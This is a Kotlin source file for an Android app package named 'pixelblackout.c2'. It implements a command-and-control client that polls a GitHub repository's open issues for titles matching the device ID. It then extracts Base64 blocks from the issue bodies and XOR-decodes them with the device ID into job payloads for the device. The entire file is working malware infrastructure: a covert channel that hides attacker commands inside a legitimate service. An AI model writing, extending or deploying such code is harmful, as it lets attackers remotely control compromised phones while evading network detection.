package com.example.pixelblackout.c2

import android.content.Context
import android.util.Base64
import android.util.Log
import com.example.pixelblackout.BuildConfig
import org.json.JSONArray
import java.net.HttpURLConnection
import java.net.URL
import java.nio.charset.StandardCharsets

object GitHubIssueC2Client {
    private const val TAG = "GitHubIssueC2"
    private const val PREF = "c2_github"
    private const val KEY_LAST_ID = "last_issue_id"

    fun fetchJobs(context: Context): List<C2Job> {
        val owner = BuildConfig.GITHUB_OWNER
        val repo = BuildConfig.GITHUB_REPO
        if (owner.isNullOrBlank() || repo.isNullOrBlank()) {
            return emptyList()
        }
        val deviceId = DeviceId.get(context)
        val prefix = BuildConfig.GITHUB_ISSUE_PREFIX.ifBlank { "C2" }
        if (BuildConfig.DEBUG) Log.d(TAG, "fetchJobs: owner=$owner repo=$repo prefix=$prefix device=$deviceId")
        val prefs = context.getSharedPreferences(PREF, Context.MODE_PRIVATE)
        val lastSeen = prefs.getLong(KEY_LAST_ID, 0L)
        if (BuildConfig.DEBUG) Log.d(TAG, "fetchJobs: lastSeen=$lastSeen")

        val issues = runCatching { requestIssues(owner, repo) }.getOrElse {
            Log.d(TAG, "fetch error: ${it.message}")
            return emptyList()
        }

        if (issues.length() == 0) {
            if (BuildConfig.DEBUG) Log.d(TAG, "fetchJobs: no issues returned")
            return emptyList()
        }
        if (BuildConfig.DEBUG) Log.d(TAG, "fetchJobs: totalIssues=${issues.length()}")

        val jobs = mutableListOf<C2Job>()
        var maxSeen = lastSeen
        for (i in 0 until issues.length()) {
            val issue = issues.optJSONObject(i) ?: continue
            val issueId = issue.optLong("id")
            val title = issue.optString("title")
            if (BuildConfig.DEBUG) Log.d(TAG, "consider[#${i}] id=$issueId title='${title.take(60)}'")
            if (issueId <= lastSeen) {
                if (BuildConfig.DEBUG) Log.d(TAG, "skip: id=$issueId <= lastSeen=$lastSeen")
                continue
            }
            if (!matchesTitle(prefix, deviceId, title)) {
                if (BuildConfig.DEBUG) Log.d(TAG, "skip: title mismatch for device='$deviceId' prefix='$prefix'")
                continue
            }
            if (BuildConfig.DEBUG) Log.d(TAG, "match: device + prefix ok (id=$issueId)")
            val body = issue.optString("body")
            val encoded = extractEncodedBlock(body)
            if (encoded == null) {
                if (BuildConfig.DEBUG) Log.d(TAG, "skip: no encoded block in body (id=$issueId)")
                continue
            }
            if (BuildConfig.DEBUG) Log.d(TAG, "encoded candidate len=${encoded.length} sample='${encoded.take(32)}'")
            val payload = decodePayload(deviceId, encoded)
            if (payload == null) {
                if (BuildConfig.DEBUG) Log.d(TAG, "skip: decode failed / invalid payload (id=$issueId)")
                continue
            }
            if (BuildConfig.DEBUG) Log.d(TAG, "accept: job id=$issueId payloadLen=${payload.length}")
            jobs += C2Job(issueId.toString(), payload = payload)
            if (issueId > maxSeen) {
                maxSeen = issueId
            }
        }

        if (maxSeen > lastSeen) {
            if (BuildConfig.DEBUG) Log.d(TAG, "advancing lastSeen -> $maxSeen")
            prefs.edit().putLong(KEY_LAST_ID, maxSeen).apply()
        } else {
            if (BuildConfig.DEBUG) Log.d(TAG, "lastSeen unchanged ($lastSeen)")
        }

        val sorted = jobs.sortedBy { it.id.toLongOrNull() ?: Long.MAX_VALUE }
        if (BuildConfig.DEBUG) Log.d(TAG, "fetchJobs: returning ${sorted.size} job(s)")
        return sorted
    }

    private fun requestIssues(owner: String, repo: String): JSONArray {
        val url = URL("https://api.github.com/repos/$owner/$repo/issues?state=open&per_page=20&sort=created&direction=asc")
        val connection = (url.openConnection() as HttpURLConnection).apply {
            connectTimeout = 4000
            readTimeout = 4000
            requestMethod = "GET"
            setRequestProperty("Accept", "application/vnd.github+json")
            setRequestProperty("User-Agent", "pixelblackout-c2")
        }
        return try {
            val code = connection.responseCode
            if (BuildConfig.DEBUG) Log.d(TAG, "requestIssues: HTTP $code url=$url")
            if (code !in 200..299) {
                throw IllegalStateException("HTTP $code")
            }
            val body = connection.inputStream.use { it.readBytes() }
            if (BuildConfig.DEBUG) Log.d(TAG, "requestIssues: bytes=${body.size}")
            val text = String(body, StandardCharsets.UTF_8)
            JSONArray(text)
        } finally {
            connection.disconnect()
        }
    }

    private fun matchesTitle(prefix: String, deviceId: String, title: String): Boolean {
        val parts = title.split("::")
        if (parts.size < 3) {
            return false
        }
        val (p, dev) = parts.take(2)
        return p == prefix && dev == deviceId
    }

    private fun extractEncodedBlock(body: String): String? {
        val trimmed = body.trim()
        if (trimmed.isEmpty()) return null
        val fenceStart = trimmed.indexOf("```")
        val content = if (fenceStart >= 0) {
            val fenceEnd = trimmed.indexOf("```", startIndex = fenceStart + 3)
            if (fenceEnd > fenceStart) {
                trimmed.substring(fenceStart + 3, fenceEnd)
            } else {
                trimmed.substring(fenceStart + 3)
            }
        } else {
            trimmed
        }
        val candidate = content
            .lines()
            .map { it.trim() }
            .firstOrNull { it.isNotEmpty() }
        if (BuildConfig.DEBUG) {
            if (candidate != null) {
                Log.d(TAG, "extractEncodedBlock: got candidate len=${candidate.length}")
            } else {
                Log.d(TAG, "extractEncodedBlock: no candidate lines")
            }
        }
        return candidate
    }

    private fun decodePayload(deviceId: String, encoded: String): String? {
        return runCatching {
            val data = Base64.decode(encoded, Base64.DEFAULT)
            val key = deviceId.toByteArray(StandardCharsets.UTF_8)
            val result = ByteArray(data.size)
            for (i in data.indices) {
                result[i] = (data[i].toInt() xor key[i % key.size].toInt()).toByte()
            }
            val text = String(result, StandardCharsets.UTF_8).trim()
            if (text.isEmpty() || !looksLikePayload(text)) {
                null
            } else {
                text
            }
        }.getOrElse {
            if (BuildConfig.DEBUG) Log.d(TAG, "decode error: ${it.message}")
            null
        }
    }

    private fun looksLikePayload(text: String): Boolean {
        val ok = runCatching {
            val raw = Base64.decode(text, Base64.DEFAULT)
            raw.size > 28
        }.getOrDefault(false)
        if (BuildConfig.DEBUG) Log.d(TAG, "looksLikePayload: ${ok} (len=${text.length})")
        return ok
    }
}
